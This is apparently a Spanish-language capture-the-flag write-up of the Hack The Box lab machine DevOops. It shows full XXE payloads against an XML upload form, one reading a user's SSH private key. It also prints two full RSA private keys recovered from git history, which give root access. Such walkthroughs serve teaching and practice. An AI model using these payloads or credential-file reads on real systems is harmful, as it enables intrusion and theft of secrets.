---
title: Hack The Box DevOops
author: k4miyo
date: 2021-10-05
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [XXE, File Misconfiguration]
ping: true
---

## DevOops
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.91.

```bash
❯ ping -c 1 10.10.10.91
PING 10.10.10.91 (10.10.10.91) 56(84) bytes of data.
64 bytes from 10.10.10.91: icmp_seq=1 ttl=63 time=136 ms

--- 10.10.10.91 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.314/136.314/136.314/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.91 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-05 21:47 CDT
Initiating Ping Scan at 21:47
Scanning 10.10.10.91 [4 ports]
Completed Ping Scan at 21:47, 0.18s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:47
Scanning 10.10.10.91 [65535 ports]
Discovered open port 22/tcp on 10.10.10.91
Discovered open port 5000/tcp on 10.10.10.91
Completed SYN Stealth Scan at 21:48, 48.09s elapsed (65535 total ports)
Nmap scan report for 10.10.10.91
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.42 seconds
           Raw packets sent: 73633 (3.240MB) | Rcvd: 73411 (2.936MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.91
   5   │     [*] Open ports: 22,5000
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,5000 10.10.10.91 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-05 21:49 CDT
Nmap scan report for 10.10.10.91
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
```

Vemos que tenemos el puerto 5000 abierto bajo el protocolo HTTP; por lo que antes de ver su contenido a través de un explorador, vamos a ver que tecnologías corren con nuestra herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.91:5000/
http://10.10.10.91:5000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[gunicorn/19.7.1], IP[10.10.10.91]
```

No tenemos nada interesante, así que hora si vamos a ver el contenido web.

![""](/assets/images/htb-devoops/devoops-web.png)

Tampco no vemos nada interesante, tanto en el sitio web como en el código fuente. Asi que vamos a tratar de descubrir recursos en el servidor.

```bash
❯ wfuzz -c --hc=404 --hh=285 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.91:5000/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.91:5000/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000126:   200        1815 L   24122 W    517022 Ch   "feed"                                                          
000000366:   200        0 L      39 W       347 Ch      "upload"                                                        
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 507
Filtered Requests: 505
Requests/sec.: 0
```

Tenemos dos recursos: `feed` y `upload`; por lo tanto, vamos a echarles un ojo. Vemos que para  `feed` tenemos el la misma imagen que observamos anteriormente y para `upload` se ve que podemos subir un archivo y nos indican *XML elements: Author, Subject, Content*, asi que debe ser un archivo xml que debe contener dichos elementos. Para observar que hace el sitio, vamos a crear un archivo de prueba:

```xml
<elements>
        <Author>K4miyo</Author>
        <Subject>Test</Subject>
        <Content>Esto es un test</Content>
</elements>
```

Y vamos a subirlo al servidor:

![""](/assets/images/htb-devoops/devoops-xml.png)

Vemos que nos nuestra nuestra información de prueba y además tenemos un recurso donde almacena dicho archivo `/uploads/test.xml`. A este punto ya debemos estar pensando en un ***[XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) (XML External Entity)***. Asi que vamos a modificar nuestro archivo para obtener ejecución de comandos a nivel de sistema. (**Nota**: Para evitar problemas del lado del servidor y que no nos interprete la información, debemos cambiar el nombre del archivo).

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<elements>
        <Author>&xxe;</Author>
        <Subject>Test</Subject>
        <Content>Esto es un test</Content>
</elements>
```

![""](/assets/images/htb-devoops/devoops-etc.png)

Podemos visualizar archivos de sistema, para este caso el archivo `/etc/passwd`. Recordando que tenemos el puerto 22 abierto, podríamos tratar de visualizar el archivo `id_rsa` del usuario **roosa**.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<elements>
        <Author>&xxe;</Author>
        <Subject>Test</Subject>
        <Content>Esto es un test</Content>
</elements>
```

![""](/assets/images/htb-devoops/devoops-idrsa.png)

Nos copiamos dicho archivo y lo guardamos en nuestro directorio de trabajo. Ahora vamos a tratar de ingresar por el puerto 22 como el usuario **roosa** y hay que recordar que debemos de darle permiso 600 al archivo `id_rsa` que hemos identificado para que no nos mande un problema.

```bash
❯ ssh -i id_rsa roosa@10.10.10.91
The authenticity of host '10.10.10.91 (10.10.10.91)' can't be established.
ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.91' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

roosa@gitter:~$ whoami
roosa
roosa@gitter:~$
```

A este punto ya nos encontramos dentro del sistema y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, por lo que procedemos a enumerar un poco el sistema.

```bash
roosa@gitter:/$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
roosa@gitter:/$ sudo -l
sudo: unable to resolve host gitter: Connection timed out
[sudo] password for roosa: 
roosa@gitter:/$ cd /
roosa@gitter:/$ find \-perm -4000 2>/dev/null
./bin/ntfs-3g
./bin/umount
./bin/su
./bin/ping6
./bin/mount
./bin/ping
./bin/fusermount
./usr/bin/chsh
./usr/bin/vmware-user-suid-wrapper
./usr/bin/gpasswd
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/sudo
./usr/bin/newgrp
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/xorg/Xorg.wrap
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/eject/dmcrypt-get-device
./usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
./usr/sbin/pppd
roosa@gitter:/$
```

Vemos que nos encontramos dentro del grupo `sudo`; sin embargo, no contamos con la contraseña del usuario **roosa**, por lo que poco podemos hacer. Vamos a echarle un ojo al directorio `/home` a ver si tenemos algo interesante:

```bash
roosa@gitter:/$ cd /home
roosa@gitter:/home$ ll
total 28
drwxr-xr-x  7 root     root     4096 Mar 26  2021 ./
drwxr-xr-x 23 root     root     4096 Mar 26  2021 ../
drwxr-xr-x  2 blogfeed blogfeed 4096 Mar 26  2021 blogfeed/
drwxr-xr-x  5 git      git      4096 Mar 26  2021 git/
drwx------  2 root     root     4096 Mar 26  2021 lost+found/
drwxr-xr-x 16 osboxes  osboxes  4096 Mar 26  2021 osboxes/
drwxr-xr-x 22 roosa    roosa    4096 Mar 26  2021 roosa/
roosa@gitter:/home$
```

Tenemos un directorio con nombre curioso `git`, lo que nos haría pensar que se trata de un proyecto de Github; así que vamos a tratar de ver si existen un archivo de extensión **.git**.

```bash
roosa@gitter:/home$ find \-name *.git 2>/dev/null
./roosa/work/blogfeed/.git
roosa@gitter:/home$
```

Y vemos que se encuentra en la ruta `/home/roosa/work/blogfeed/`, ingresamos al directorio y vemos los siguientes archivos.

```bash
roosa@gitter:~/work/blogfeed$ ll
total 28
drwxrwx--- 5 roosa roosa 4096 Mar 26  2021 ./
drwxrwxr-x 3 roosa roosa 4096 Mar 26  2021 ../
drwxrwx--- 8 roosa roosa 4096 Mar 26  2021 .git/
-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
drwxrwx--- 3 roosa roosa 4096 Mar 26  2021 resources/
-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh*
drwxrwx--- 2 roosa roosa 4096 Mar 26  2021 src/
roosa@gitter:~/work/blogfeed$
```

Como se trata de un proyecto, podriamos utilizar el comando `git` para obtener información del mismo.

```bash
roosa@gitter:~/work/blogfeed$ git status
On branch master
Your branch is up-to-date with 'origin/master'.
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        modified:   run-gunicorn.sh

Untracked files:
  (use "git add <file>..." to include in what will be committed)

        src/.feed.py.swp
        src/access.log
        src/app.py
        src/app.py~
        src/config.py
        src/devsolita-snapshot.png
        src/feed.log
        src/feed.pyc
        src/save.p

no changes added to commit (use "git add" and/or "git commit -a")
roosa@gitter:~/work/blogfeed$ 
roosa@gitter:~/work/blogfeed$ git log --name-only --oneline
7ff507d Use Base64 for pickle feed loading
src/feed.py
src/index.html
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
run-gunicorn.sh
src/feed.py
cec54d8 Debug support added to make development more agile.
run-gunicorn.sh
src/feed.py
ca3e768 Blogfeed app, initial version.
src/feed.py
src/index.html
src/upload.html
dfebfdf Gunicorn startup script
run-gunicorn.sh
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
1422e5a Initial commit
README.md
roosa@gitter:~/work/blogfeed$
```

Tenemos que para el id **d387abf** se integró una key y para el id **33e87c3** se tiene un *commit accidentalmente revertido* y nos arroja una ruta de un archivo; asi que vamos a echarle un ojo.

```bash
roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
roosa@gitter:~/work/blogfeed$
```

El archivo aloja una **id_rsa**, pero no sabemos de quien, asi que analizando un poco los resultados obtenidos del comando `git log --name-only --oneline`, vemos que el usuario agregó una llave (*key*) y posteriormente lo revirtió, posiblemente porque se equivocó (**Nota**: La secuencia de lee de abajo hacia arriba, es decir, los cambios más recientes se encuetran hasta arriba).

```bash
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
```

Para ver la clave que se cambió, podemos aplicar un diferencial entre el id **d387abf** (asociado a `add key for feed integration from tnerprise backend`) y el id **1422e5a** (asociado a `Initial commit`). 

```bash
roosa@gitter:~/work/blogfeed$ git diff d387abf 1422e5a
diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
deleted file mode 100644
index 44c981f..0000000
--- a/resources/integration/authcredentials.key
+++ /dev/null
@@ -1,28 +0,0 @@
------BEGIN RSA PRIVATE KEY-----
-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
------END RSA PRIVATE KEY-----
-
roosa@gitter:~/work/blogfeed$
```

Tambien podríamos comparar el id **d387abf** contra **33e87c3** (asociado a `reverted accidental commit with proper key`), pero veríamos las dos claves.

```bash
roosa@gitter:~/work/blogfeed$ git diff 33e87c3 d387abf                                                                           
diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key                               
index f4bde49..44c981f 100644
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,27 +1,28 @@
 -----BEGIN RSA PRIVATE KEY----- 
-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
+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
 -----END RSA PRIVATE KEY-----
```

Nos copiamos la **id_rsa** identificada, le damos el permiso 600 y procedemos a conectarnos a través del puerto 22 como el usuario **root**:

```bash
❯ ssh -i id_rsa root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# whoami
root
root@gitter:~#
```

Ya somos **root** y podemos visualizar la flag (root.txt).
